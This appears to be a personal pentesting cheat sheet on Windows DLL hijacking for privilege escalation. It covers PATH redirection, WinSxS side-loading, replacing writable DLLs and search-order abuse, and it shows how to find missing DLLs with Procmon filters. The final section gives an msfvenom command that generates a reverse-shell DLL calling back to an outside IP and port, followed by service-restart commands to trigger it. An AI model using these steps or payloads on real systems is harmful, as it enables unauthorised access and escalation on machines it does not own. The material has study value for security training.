##### Explanation
Windows programs use DLL library files to work, and to use certain functions. There are checks for DLL files in a certain order:

##### Requirements
A program run as another user

### DLL redirection
Edit the %PATH% to include the malicious `.dll` first.

### DLL Side-loading (WinSxS replacement)
Replace the legitimate `.dll`  with the malicious one, on the WinSxS end (think replacing python imports on the system-end)

### DLL replacement
Check for writability of DLL files called by a program run as another user.
If there is writability, replace the DLL

### DLL Search order hijacking
If the absolute path is not specified, `.dll` files are searched for in this order:

##### DLL safe search enabled (default)
The directory from which the application is loaded (`.exe` location)
The system directory: `C:\Windows\System32\ // To make sure, try "GetSystemDirectory"`
The 16-bit system directory: `C:\Windows\System\`
The windows directory: `C:\Windows\ // To make sure, try "GetWindowsDirectory"`
The current directory (from which the command is run)
PATH

##### DLL safe search disabled (suspicious)
The directory from which the application is loaded (`.exe` location)
The current directory (from which the command is run)
The system directory: `C:\\Windows\\System32\\ // To make sure, try "GetSystemDirectory"`
The 16-bit system directory: `C:\\Windows\\System\\`
The windows directory: `C:\\Windows\\ // To make sure, try "GetWindowsDirectory"`
PATH 
```
EXE_LOCATION
EXE_CALL_LOCATION
C:\Windows\System32
C:\Windows\System
C:\Windows
$env:path
```
### Phantom DLL Hijacking with Procmon
Using RDP, open Procomon and select "Filter".

In the left-side dropdown, select "Process name".
Make sure the second dropdown equals "is".
Write the executable name (example: `dllservice.exe`) in the text field.
Add the rule, and apply:
```
process name is SERIVCE_NAME then include
```

Add another rule:
In the left-side dropdown, select "Result".
In the middle dropdown, select "is".
In the input box, type "NAME NOT FOUND".
Add and apply the rule:
```
result is NAME NOT FOUND then include
```

Run/start the program/service, check back in Procmon.
Look for the attempted calls to `.dll` libraries.
If one of the attemted call locations is writable, place a reverse shell.

Generate the DLL:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.1.167 LPORT=4444 -f dll -o msf.dll
```
OR
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
Note: sometimes, you'll have to make the DLL export certain functions (think python libraries), research [online](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking).

Place the `.dll` in the writable folder, and restart the application:
```
sc.exe stop SERVICE_NAME
sc.exe start SERVICE_NAME
```